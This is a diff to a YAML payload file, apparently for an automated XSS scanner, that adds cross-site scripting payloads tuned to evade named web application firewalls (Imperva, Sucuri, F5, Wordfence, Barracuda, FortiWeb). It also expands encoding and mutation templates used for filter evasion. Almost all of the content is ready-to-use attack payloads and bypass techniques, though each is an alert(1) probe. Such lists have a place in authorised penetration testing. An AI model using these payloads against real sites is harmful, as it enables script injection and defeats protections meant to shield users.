@@ -193,7 +193,7 @@ header_injection:
   - "'><img src=x onerror=alert(1)>"
 
 # =========================================================
-# WAF BYPASS — CLOUDFLARE
+# WAF BYPASS — VENDOR SPECIFIC
 # =========================================================
 waf_bypass:
   cloudflare:
@@ -220,6 +220,24 @@ waf_bypass:
     - "<script>alert(1)</script>"
     - "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
 
+  imperva:
+    - "<svg><animate onbegin=alert(1)>"
+    - "<details open ontoggle=alert(1)>"
+    - "<img src=x onerror=alert(1)>"
+    - "<video><source onerror=alert(1)>"
+
+  sucuri:
+    - "<svg/onload=alert(1)>"
+    - "<svg%0aonload=alert(1)>"
+    - "<img src=x onerror=alert`1`>"
+    - "<ScRiPt>alert(1)</sCrIpT>"
+
+  f5:
+    - "<svg/onload=alert(1)>"
+    - "<img/src=x/onerror=alert(1)>"
+    - "<svg%09onload=alert(1)>"
+    - "<script>alert(1)//</script>"
+
   modsecurity:
     - "<svg/onload=alert(1)>"
     - "<svg onload=alert(1)//>"
@@ -227,6 +245,21 @@ waf_bypass:
     - "<script>alert(1)//</script>"
     - "<ScRiPt>alert(1)</sCrIpT>"
     - "<script>alert(/1/)</script>"
+
+  wordfence:
+    - "<svg/onload=alert`1`>"
+    - "<img src=x onerror=alert`1`>"
+    - "<details open ontoggle=alert(1)>"
+
+  barracuda:
+    - "<svg%0aonload=alert(1)>"
+    - "<img src=x onerror=alert(1)>"
+    - "<script>alert(1)//</script>"
+
+  fortiweb:
+    - "<svg/onload=alert(1)>"
+    - "<img src=x onerror=alert`1`>"
+    - "<details open ontoggle=alert(1)>"
 
   generic:
     - "<img src=x onerror=alert(1)//>"
@@ -240,32 +273,49 @@ waf_bypass:
     - "<script>\\u0061lert(1)</script>"
 
 # =========================================================
-# ENCODING TEMPLATES — py-brain auto-applies these
+# ENCODING TEMPLATES (metadata only — py-brain applies these)
 # =========================================================
 encoding_variants:
   url_single:
     description: "Single URL encode"
-    example: "<img src=x onerror=alert(1)>" -> "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
+    example_input: '<img src=x onerror=alert(1)>'
+    example_output: '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'
   url_double:
     description: "Double URL encode"
+    example_input: '<img src=x>'
+    example_output: '%253Cimg%2520src%253Dx%253E'
   html_decimal:
     description: "HTML decimal entities"
-    example: "<" -> "&#60;"
+    example_input: '<'
+    example_output: '&#60;'
   html_hex:
     description: "HTML hex entities"
-    example: "<" -> "&#x3c;"
+    example_input: '<'
+    example_output: '&#x3c;'
   html_named:
     description: "HTML named entities"
+    example_input: '<'
+    example_output: '&lt;'
   unicode:
     description: "JS unicode escape"
-    example: "<" -> "\\u003c"
+    example_input: '<'
+    example_output: '\u003c'
   hex_js:
     description: "JS hex escape"
-    example: "<" -> "\\x3c"
+    example_input: '<'
+    example_output: '\x3c'
   base64:
     description: "Base64 (for eval contexts)"
+    example_input: 'alert(1)'
+    example_output: 'YWxlcnQoMSk='
   mixed_case:
-    description: "Random case: <ScRiPt>"
+    description: "Random case mutation"
+    example_input: '<script>'
+    example_output: '<ScRiPt>'
+  whitespace:
+    description: "Whitespace mutation"
+    example_input: '<svg onload>'
+    example_output: '<svg	onload>'
 
 # =========================================================
 # BLIND XSS — callback-based
